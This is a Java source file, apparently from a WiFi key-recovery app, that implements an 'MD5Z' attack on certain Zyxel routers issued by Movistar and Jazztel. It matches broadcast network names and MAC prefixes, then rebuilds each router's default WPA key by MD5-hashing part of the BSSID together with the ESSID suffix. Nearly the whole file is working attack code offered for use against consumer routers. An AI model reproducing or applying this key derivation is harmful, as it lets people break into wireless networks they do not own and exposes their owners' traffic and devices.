package es.pulimento.wifi.core.algorithms;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;

public class Md5ZAlgorithm extends CrackAlgorithm {

	/*
	 * MD5Z algorithm.
	 * Used by some Zyxel routers from Movistar
	 * and Jazztel in Spain and in other countries
	 */

	public Md5ZAlgorithm(String essid, String bssid) {
		super(essid, bssid);
	}

	@Override
	protected void setPatterns() {

		// ESSID: WLAN_XXXX
		// BSSID: 00:1F:A4:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(00:1F:A4:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 00:1F:A4:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:1F:A4:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 00:23:F8:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(00:23:F8:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 00:23:F8:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:23:F8:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 40:4A:03:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(40:4A:03:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 40:4A:03:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(40:4A:03:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 98:F5:37:XX:XX:XX
		addPattern("WLAN_([0-9a-fA-F]{4})", "(98:F5:37:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 98:F5:37:XX:XX:XX
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(98:F5:37:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: F4:3E:61:XX:XX:XX
		// GongJin Electronics Co.
		addPattern("WLAN_([0-9a-fA-F]{4})", "(F4:3E:61:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: F4:3E:61:XX:XX:XX
		// GongJin Electronics Co.
		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(F4:3E:61:[0-9A-Fa-f:]{8})");

		// ESSID: WLAN_XXXX
		// BSSID: 00:19:15:XX:XX:XX
		// TeCom
		// TODO unknown algorythm?
		// addPattern("WLAN_([0-9a-fA-F]{4})", "(00:19:15:[0-9A-Fa-f:]{8})");

		// ESSID: JAZZTEL_XXXX
		// BSSID: 00:19:15:XX:XX:XX
		// TeCom
		// TODO unknown algorythm?
		// addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:19:15:[0-9A-Fa-f:]{8})");

	}

	@Override
	protected String crackAlgorithm(String essid_data, String bssid_data) {
		essid_data = essid_data.toUpperCase();
		bssid_data = bssid_data.replace(":", "").toUpperCase();
		String preMD5 = bssid_data.substring(0, 8).toLowerCase()
				+ (essid_data.substring(essid_data.length() - 4, essid_data.length())).toLowerCase();
		return getMD5(preMD5).toUpperCase();
	}

	private static String getMD5(String input) {
		try {
			MessageDigest md = MessageDigest.getInstance("MD5");
			byte[] messageDigest = md.digest(input.getBytes());
			BigInteger number = new BigInteger(1, messageDigest);
			String hashtext = number.toString(16);
			while (hashtext.length() < 20) {
				hashtext = "0" + hashtext;
			}
			return hashtext.substring(0, 20);
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
	}

	public static boolean supportsEncryption(WirelessEncryption mCapabilities) {
		return (mCapabilities.equals(WirelessEncryption.WPA)) ? true : false;
	}
}
